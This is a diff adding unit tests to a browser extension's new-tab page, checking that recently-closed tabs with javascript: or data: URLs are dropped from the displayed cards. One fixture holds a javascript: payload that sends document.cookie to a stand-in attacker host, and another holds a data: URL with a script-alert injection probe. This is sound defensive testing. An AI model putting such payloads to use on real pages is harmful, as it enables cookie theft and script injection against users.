@@ -257,6 +257,41 @@ describe('Recently-closed tabs — newTab.js', () => {
 		expect(appendedCards[0].href).toBe('https://example.com');
 	});
 
+	it('skips tabs with a javascript: URL (§1.3 — card.href must never be javascript:)', () => {
+		// Middle-click/Ctrl+click bypass the onclick handler and navigate the
+		// href directly, so a javascript: session URL must be filtered out.
+		const items = [
+			{ tab: { url: 'javascript:fetch("http://attacker.example/"+document.cookie)', title: 'Evil', sessionId: 's1', favIconUrl: null, incognito: false } },
+			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's2', favIconUrl: null, incognito: false } },
+		];
+		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
+		harness.refreshRecent();
+		expect(appendedCards).toHaveLength(1);
+		expect(appendedCards[0].href).toBe('https://example.com');
+	});
+
+	it('skips tabs with a data: URL (§1.3)', () => {
+		const items = [
+			{ tab: { url: 'data:text/html,<script>alert(1)</script>', title: 'Data', sessionId: 's1', favIconUrl: null, incognito: false } },
+			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's2', favIconUrl: null, incognito: false } },
+		];
+		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
+		harness.refreshRecent();
+		expect(appendedCards).toHaveLength(1);
+		expect(appendedCards[0].href).toBe('https://example.com');
+	});
+
+	it('keeps http/https/ftp recently-closed tabs (§1.3 — valid protocols pass)', () => {
+		const items = [
+			{ tab: { url: 'https://secure.example/', title: 'S', sessionId: 's1', favIconUrl: null, incognito: false } },
+			{ tab: { url: 'http://plain.example/', title: 'P', sessionId: 's2', favIconUrl: null, incognito: false } },
+			{ tab: { url: 'ftp://files.example/', title: 'F', sessionId: 's3', favIconUrl: null, incognito: false } },
+		];
+		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
+		harness.refreshRecent();
+		expect(appendedCards).toHaveLength(3);
+	});
+
 	// ==================== favicon ====================
 
 	it('adds favicon img inside favicon span when favIconUrl is valid', () => {
